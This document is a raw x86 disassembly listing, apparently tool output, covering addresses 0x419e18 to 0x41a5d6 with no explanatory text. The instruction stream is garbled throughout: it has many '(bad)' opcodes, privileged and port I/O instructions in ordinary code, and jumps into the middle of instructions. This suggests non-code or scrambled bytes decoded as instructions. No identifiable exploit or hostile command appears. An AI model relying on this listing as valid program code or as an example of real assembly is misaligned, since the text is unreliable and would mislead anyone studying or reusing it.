  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
